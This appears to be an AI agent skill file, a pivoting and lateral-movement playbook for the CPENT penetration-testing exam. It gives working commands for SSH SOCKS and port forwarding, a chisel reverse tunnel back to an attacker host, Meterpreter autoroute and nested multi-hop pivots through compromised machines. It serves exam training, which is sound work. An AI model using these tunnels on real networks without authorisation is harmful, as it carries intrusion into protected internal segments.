---
name: pivoting
description: Pivoting and lateral movement playbook for CPENT — SSH SOCKS/port-forward, chisel, ligolo-ng, meterpreter autoroute, and double/triple pivots. Use the moment you compromise a dual-NIC host. Only 5% of marks but it gates whole ranges.
---

# Pivoting & Lateral Movement (Zone 8, 5% — CRITICAL: gates other ranges)

If you can't pivot you can't reach AD/OT/hidden segments worth far more. The moment a
compromised host shows a second interface, build the tunnel and update the map.

## SSH dynamic SOCKS (most reliable when SSH exists)

```
ssh -fN -D 1080 user@pivot-host
# /etc/proxychains.conf:  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 22,80,445,3389 <internal-target>   # -sT -Pn is mandatory over SOCKS
```

## SSH port-forwarding

```
ssh -L 8080:<internal-target>:80 user@pivot     # local: reach a remote service locally
ssh -R 4444:127.0.0.1:4444 user@pivot           # remote: expose your listener inward
```

## Chisel (no SSH)

```
# attacker:  chisel server -p 8080 --reverse
# pivot:     chisel client <attacker-ip>:8080 R:socks
# then proxychains via socks5 127.0.0.1 1080
```

## Meterpreter autoroute

```
run autoroute -s 172.16.20.0/24
background ; use auxiliary/server/socks_proxy ; set SRVPORT 1080 ; run
```

## Double / triple pivot

Chain tunnels when a deeper net is only reachable through an intermediate host:
1. Compromise Tier-1, SOCKS/autoroute to Tier-2.
2. Through that tunnel, compromise Tier-2.
3. From Tier-2, open a second tunnel to Tier-3; nest the SOCKS proxies.
4. **Test each hop with one known port first** (`proxychains curl http://<t>`) before full
   scans. Ligolo-ng is excellent for clean multi-hop; `socat`/`netsh portproxy`/`plink` for
   single-port relays on constrained hosts.

## Always update the map

Edit `engagement/network-map.md`: attacker → pivot1 (ext/int IPs) → pivot2 → targets, and
mark every dual-NIC host. A stale map loses you a segment.
